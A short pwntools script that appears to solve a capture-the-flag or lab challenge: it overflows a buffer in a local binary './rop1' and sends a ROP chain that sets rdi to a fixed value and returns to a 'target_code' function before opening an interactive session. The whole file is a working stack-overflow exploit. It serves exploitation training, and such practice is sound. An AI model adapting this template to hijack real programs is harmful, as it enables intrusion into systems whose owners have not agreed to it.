from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = 'amd64'

p = process("./rop1")
binary = ELF("./rop1")
rop = ROP(binary)

target_code_addr = binary.symbols["target_code"]

payload = b""
payload += b"A" * 0x58

rop(rdi = 0x7373656332303234)   # gadgets that will make rdi to expected value
rop.raw(target_code_addr)       # gadgets that will return to target function
payload += rop.chain()
payload = payload + b"B" * (128 - len(payload)) # padding

p.recvuntil(b"[*] Please input the length of data:\n")
p.sendline(b"128")
p.recvuntil(b"[*] Please input the data:\n")
p.send(payload)

p.interactive()